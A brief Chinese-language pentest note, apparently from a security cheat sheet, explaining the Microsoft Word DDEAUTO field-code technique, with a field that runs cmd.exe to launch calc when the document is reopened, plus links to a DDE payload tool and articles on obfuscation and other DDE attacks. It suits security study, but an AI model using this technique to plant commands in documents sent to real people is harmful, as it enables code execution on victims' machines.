# DDEAUTO

## 利用方法

新建Word文档，按下 `CTRL + F9`，输入 

```
DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc"
```

保存再次打开即可触发

## 其他工具

* [Office-DDE-Payloads](https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads)

## 其他文章

* [DDEAUTO 混淆技巧](http://staaldraad.github.io/2017/10/23/msword-field-codes/)
* [更多 DDEAUTO 攻击方法，INCLUDE 语法、Outlook Calendar](https://pentestlab.blog/2018/01/16/microsoft-office-dde-attacks/)
